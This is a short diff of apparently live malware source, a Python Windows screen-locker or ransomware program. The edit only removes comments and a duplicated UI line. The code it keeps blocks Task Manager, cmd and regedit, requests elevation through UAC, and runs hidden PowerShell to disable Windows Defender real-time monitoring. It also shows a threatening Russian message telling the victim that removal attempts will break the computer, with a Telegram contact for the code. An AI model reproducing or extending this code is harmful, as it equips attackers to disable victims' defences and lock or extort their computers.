@@ -21,13 +21,11 @@ BLOKC_EXE = ["notepad.exe", "taskmgr.exe", "cmd.exe", "regedit.exe", "ProcessHac
 # ================= ОБХОД UAC И АНТИВИРУСА =================
 def elevate_and_evade():
     if not ctypes.windll.shell32.IsUserAnAdmin():
-        # Запуск от админа (UAC)
         ctypes.windll.shell32.ShellExecuteW(
             None, "runas", sys.executable, " ".join(sys.argv), None, 1
         )
         sys.exit(0)
 
-    # Если мы уже админ, отключаем Defender и добавляем исключение
     try:
         subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", 
                         "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue;"
@@ -202,8 +200,6 @@ def main():
             "Любые попытки снять вирус приведут к поломке компьютера,\n"
             "так что не выебывайся ублюдок.\n\n"
             "За кодом писать @pu709 (Telegram)"
-        ), fg="#AAAAAA", bg="#000000", font=("Consolas", 13), justify="center")
-        info.pack(pady=20)
         ), fg="#AAAAAA", bg="#000000", font=("Consolas", 13), justify="center")
         info.pack(pady=20)
 
